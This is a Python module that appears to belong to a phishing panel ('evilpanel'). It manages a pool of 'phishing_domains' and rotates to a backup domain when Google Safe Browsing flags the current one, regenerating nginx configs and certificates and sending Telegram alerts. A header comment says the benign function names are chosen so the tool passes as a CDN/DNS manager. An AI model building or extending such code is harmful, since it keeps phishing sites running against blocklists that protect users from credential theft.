"""
Domain Manager Module
Handles domain rotation, backup domains, and DNS updates

OPSEC: Uses benign function names - appears as CDN/DNS management tool
"""

import os
import yaml
import json
import subprocess
from typing import Dict, List, Optional, Any
from pathlib import Path
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
import threading
import time


@dataclass
class DomainConfig:
    """Domain configuration data class"""
    domain: str
    status: str = "active"  # active, backup, flagged, expired
    added_at: str = ""
    last_used: str = ""
    ssl_expiry: str = ""
    cloudflare_zone_id: str = ""
    notes: str = ""
    
    def __post_init__(self):
        if not self.added_at:
            self.added_at = datetime.now().isoformat()


class DomainRotationManager:
    """
    Manages domain rotation for operational continuity
    
    Features:
    - Multiple backup domains ready for rotation
    - Automatic SSL certificate management
    - Cloudflare DNS integration
    - Nginx configuration updates
    - Telegram notifications
    """
    
    def __init__(self, config_path: Optional[str] = None):
        self.config_path = Path(config_path or "/opt/evilpanel/config/domains.yaml")
        self.nginx_template_path = Path("/opt/evilpanel/deploy/nginx-frontnews.conf")
        self.nginx_sites_path = Path("/etc/nginx/sites-available")
        self._config: Dict[str, Any] = {}
        self._domains: Dict[str, DomainConfig] = {}
        self._rotation_lock = threading.Lock()
        self._telegram = None
        
        self._load_config()
        
    def set_telegram_notifier(self, notifier) -> None:
        """Set Telegram notifier for alerts"""
        self._telegram = notifier
        
    def _load_config(self) -> None:
        """Load domain configuration from YAML"""
        try:
            if self.config_path.exists():
                with open(self.config_path) as f:
                    self._config = yaml.safe_load(f) or {}
            else:
                self._config = self._get_default_config()
                self._save_config()
                
            # Load domain objects
            primary = self._config.get("primary_domain", "")
            if primary:
                self._domains[primary] = DomainConfig(
                    domain=primary,
                    status="active"
                )
                
            for domain in self._config.get("phishing_domains", []):
                if isinstance(domain, str):
                    self._domains[domain] = DomainConfig(
                        domain=domain,
                        status="backup"
                    )
                elif isinstance(domain, dict):
                    self._domains[domain["domain"]] = DomainConfig(**domain)
                    
        except Exception as e:
            self._config = self._get_default_config()
            
    def _get_default_config(self) -> Dict:
        """Get default configuration structure"""
        return {
            "primary_domain": "",
            "phishing_domains": [],
            "cloudflare": {
                "enabled": False,
                "api_token": "",
                "zone_id": ""
            },
            "ssl": {
                "provider": "letsencrypt",
                "wildcard": True
            },
            "rotation": {
                "trigger": "flagged",  # flagged, time, manual
                "interval_hours": 48,
                "auto_rotate": False
            }
        }
        
    def _save_config(self) -> None:
        """Save configuration to YAML"""
        try:
            self.config_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Convert domain objects to dict for serialization
            domains_list = []
            for domain, config in self._domains.items():
                if config.status != "active":  # Primary stored separately
                    domains_list.append(asdict(config))
                    
            self._config["phishing_domains"] = domains_list
            
            with open(self.config_path, 'w') as f:
                yaml.dump(self._config, f, default_flow_style=False)
                
        except Exception:
            pass  # Silent failure
            
    def get_primary_domain(self) -> Optional[str]:
        """Get currently active primary domain"""
        return self._config.get("primary_domain", "")
        
    def get_backup_domains(self) -> List[str]:
        """Get list of backup domains ready for rotation"""
        return [
            d.domain for d in self._domains.values()
            if d.status == "backup"
        ]
        
    def get_all_domains(self) -> List[DomainConfig]:
        """Get all domain configurations"""
        return list(self._domains.values())
        
    def add_domain(self, domain: str, status: str = "backup", **kwargs) -> bool:
        """
        Add a new domain to the pool
        
        Args:
            domain: Domain name to add
            status: Initial status (active, backup)
            **kwargs: Additional domain config options
        """
        try:
            if domain in self._domains:
                return False
                
            config = DomainConfig(domain=domain, status=status, **kwargs)
            self._domains[domain] = config
            self._save_config()
            
            return True
            
        except Exception:
            return False
            
    def remove_domain(self, domain: str) -> bool:
        """Remove domain from pool"""
        try:
            if domain not in self._domains:
                return False
                
            # Don't remove active primary
            if self._domains[domain].status == "active":
                return False
                
            del self._domains[domain]
            self._save_config()
            
            return True
            
        except Exception:
            return False
            
    def set_domain_status(self, domain: str, status: str) -> bool:
        """Update domain status"""
        if domain not in self._domains:
            return False
            
        self._domains[domain].status = status
        self._save_config()
        return True
        
    def rotate_domain(self, reason: str = "manual") -> Dict:
        """
        Rotate to next backup domain
        
        Args:
            reason: Reason for rotation (flagged, time, manual)
            
        Returns:
            Dict with rotation result
        """
        with self._rotation_lock:
            result = {
                "success": False,
                "old_domain": "",
                "new_domain": "",
                "reason": reason,
                "timestamp": datetime.now().isoformat(),
                "steps_completed": []
            }
            
            # Get current primary and next backup
            old_primary = self.get_primary_domain()
            backups = self.get_backup_domains()
            
            if not backups:
                result["error"] = "No backup domains available"
                return result
                
            new_primary = backups[0]
            result["old_domain"] = old_primary
            result["new_domain"] = new_primary
            
            try:
                # Step 1: Update domain statuses
                if old_primary and old_primary in self._domains:
                    self._domains[old_primary].status = "flagged" if reason == "flagged" else "backup"
                    
                self._domains[new_primary].status = "active"
                self._domains[new_primary].last_used = datetime.now().isoformat()
                self._config["primary_domain"] = new_primary
                result["steps_completed"].append("status_update")
                
                # Step 2: Generate new Nginx config
                if self._generate_nginx_config(new_primary):
                    result["steps_completed"].append("nginx_config")
                    
                # Step 3: Generate SSL certificate
                if self._generate_ssl_cert(new_primary):
                    result["steps_completed"].append("ssl_cert")
                    
                # Step 4: Reload Nginx
                if self._reload_nginx():
                    result["steps_completed"].append("nginx_reload")
                    
                # Step 5: Update Cloudflare if enabled
                if self._config.get("cloudflare", {}).get("enabled"):
                    if self._update_cloudflare_dns(new_primary):
                        result["steps_completed"].append("cloudflare_update")
                        
                # Save config
                self._save_config()
                
                result["success"] = True
                
                # Send notification
                self._notify_rotation(result)
                
            except Exception as e:
                result["error"] = str(e)
                
            return result
            
    def _generate_nginx_config(self, domain: str) -> bool:
        """Generate Nginx configuration for new domain"""
        try:
            if not self.nginx_template_path.exists():
                return False
                
            # Read template
            with open(self.nginx_template_path) as f:
                template = f.read()
                
            # Replace domain placeholders
            # The template uses frontnews.site - replace with new domain
            config = template.replace("frontnews.site", domain)
            config = config.replace("frontnews", domain.split('.')[0])
            
            # Write new config
            new_config_path = self.nginx_sites_path / domain
            with open(new_config_path, 'w') as f:
                f.write(config)
                
            # Create symlink in sites-enabled
            enabled_link = Path("/etc/nginx/sites-enabled") / domain
            if not enabled_link.exists():
                enabled_link.symlink_to(new_config_path)
                
            return True
            
        except Exception:
            return False
            
    def _generate_ssl_cert(self, domain: str) -> bool:
        """Generate Let's Encrypt SSL certificate for domain"""
        try:
            # Check if cert already exists
            cert_path = Path(f"/etc/letsencrypt/live/{domain}/fullchain.pem")
            if cert_path.exists():
                return True
                
            # Run certbot
            cmd = [
                "certbot", "certonly",
                "--nginx",
                "-d", domain,
                "-d", f"m.{domain}",
                "-d", f"www.{domain}",
                "--non-interactive",
                "--agree-tos",
                "--email", "admin@example.com",  # Should be configurable
                "--redirect"
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            return result.returncode == 0
            
        except Exception:
            return False
            
    def _reload_nginx(self) -> bool:
        """Reload Nginx configuration"""
        try:
            # Test config first
            test_result = subprocess.run(
                ["nginx", "-t"],
                capture_output=True,
                text=True
            )
            
            if test_result.returncode != 0:
                return False
                
            # Reload
            reload_result = subprocess.run(
                ["systemctl", "reload", "nginx"],
                capture_output=True,
                text=True
            )
            
            return reload_result.returncode == 0
            
        except Exception:
            return False
            
    def _update_cloudflare_dns(self, domain: str) -> bool:
        """Update Cloudflare DNS records for domain"""
        try:
            cf_config = self._config.get("cloudflare", {})
            
            if not cf_config.get("enabled"):
                return False
                
            api_token = cf_config.get("api_token", "")
            zone_id = cf_config.get("zone_id", "")
            
            if not api_token or not zone_id:
                return False
                
            # Cloudflare API integration would go here
            # For now, return False as this requires API setup
            
            return False
            
        except Exception:
            return False
            
    def _notify_rotation(self, result: Dict) -> None:
        """Send Telegram notification about rotation"""
        if not self._telegram:
            return
            
        try:
            status_emoji = "✅" if result["success"] else "❌"
            
            message = (
                f"{status_emoji} *DOMAIN ROTATION*\n\n"
                f"Reason: `{result['reason']}`\n"
                f"Old: `{result.get('old_domain', 'N/A')}`\n"
                f"New: `{result.get('new_domain', 'N/A')}`\n"
                f"Time: `{result['timestamp']}`\n"
                f"Steps: {', '.join(result.get('steps_completed', []))}\n"
            )
            
            if result.get("error"):
                message += f"\n⚠️ Error: `{result['error']}`"
                
            self._telegram.send_message(message, parse_mode="Markdown")
            
        except Exception:
            pass  # Silent failure
            
    def check_ssl_expiry(self) -> List[Dict]:
        """Check SSL certificate expiry for all domains"""
        results = []
        
        for domain, config in self._domains.items():
            cert_path = Path(f"/etc/letsencrypt/live/{domain}/fullchain.pem")
            
            result = {
                "domain": domain,
                "has_cert": cert_path.exists(),
                "expires_soon": False,
                "expiry_date": None
            }
            
            if cert_path.exists():
                try:
                    # Parse cert expiry using openssl
                    cmd = [
                        "openssl", "x509",
                        "-enddate", "-noout",
                        "-in", str(cert_path)
                    ]
                    output = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True
                    )
                    
                    if output.returncode == 0:
                        # Parse date from output
                        date_str = output.stdout.strip().replace("notAfter=", "")
                        result["expiry_date"] = date_str
                        
                        # Check if expires within 7 days
                        # Would need proper date parsing for this
                        
                except Exception:
                    pass
                    
            results.append(result)
            
        return results
        
    def schedule_rotation(self, hours: int = 48) -> None:
        """Schedule automatic rotation after specified hours"""
        def _delayed_rotate():
            time.sleep(hours * 3600)
            self.rotate_domain(reason="scheduled")
            
        thread = threading.Thread(target=_delayed_rotate, daemon=True)
        thread.start()


# Integration with GSB Monitor
class IntegratedDomainManager(DomainRotationManager):
    """
    Extended domain manager with GSB monitoring integration
    """
    
    def __init__(self, config_path: Optional[str] = None):
        super().__init__(config_path)
        self._gsb_monitor = None
        
    def set_gsb_monitor(self, monitor) -> None:
        """Set GSB monitor for flagging detection"""
        self._gsb_monitor = monitor
        
        # Register callback for flagging alerts
        if self._gsb_monitor:
            self._gsb_monitor.checker.add_status_callback(self._on_domain_flagged)
            
    def _on_domain_flagged(self, domain: str, status: Dict) -> None:
        """Handle domain flagging - trigger rotation"""
        if status.get("overall_status") == "flagged":
            primary = self.get_primary_domain()
            
            if domain == primary:
                # Primary domain flagged - rotate immediately
                self.rotate_domain(reason="flagged")
                
    def start_monitoring(self) -> None:
        """Start monitoring all domains"""
        if self._gsb_monitor:
            domains = [d.domain for d in self._domains.values()]
            self._gsb_monitor.start(domains)
            
    def stop_monitoring(self) -> None:
        """Stop all monitoring"""
        if self._gsb_monitor:
            self._gsb_monitor.stop()


# CLI interface
if __name__ == "__main__":
    import sys
    
    manager = DomainRotationManager()
    
    if len(sys.argv) < 2:
        print("Usage: python domain_manager.py <command> [args]")
        print("Commands:")
        print("  list - List all domains")
        print("  add <domain> - Add backup domain")
        print("  remove <domain> - Remove domain")
        print("  rotate [reason] - Rotate to next backup")
        print("  ssl-check - Check SSL expiry")
        sys.exit(1)
        
    cmd = sys.argv[1]
    
    if cmd == "list":
        print("\nDomains:")
        print(f"  Primary: {manager.get_primary_domain() or 'Not set'}")
        print(f"  Backups: {manager.get_backup_domains() or 'None'}")
        
    elif cmd == "add" and len(sys.argv) >= 3:
        domain = sys.argv[2]
        if manager.add_domain(domain):
            print(f"Added: {domain}")
        else:
            print(f"Failed to add: {domain}")
            
    elif cmd == "remove" and len(sys.argv) >= 3:
        domain = sys.argv[2]
        if manager.remove_domain(domain):
            print(f"Removed: {domain}")
        else:
            print(f"Failed to remove: {domain}")
            
    elif cmd == "rotate":
        reason = sys.argv[2] if len(sys.argv) >= 3 else "manual"
        result = manager.rotate_domain(reason)
        print(f"\nRotation Result:")
        print(f"  Success: {result['success']}")
        print(f"  Old: {result['old_domain']}")
        print(f"  New: {result['new_domain']}")
        print(f"  Steps: {result.get('steps_completed', [])}")
        if result.get("error"):
            print(f"  Error: {result['error']}")
            
    elif cmd == "ssl-check":
        results = manager.check_ssl_expiry()
        print("\nSSL Certificate Status:")
        for r in results:
            status = "✓" if r["has_cert"] else "✗"
            print(f"  {status} {r['domain']}: {r.get('expiry_date', 'No cert')}")
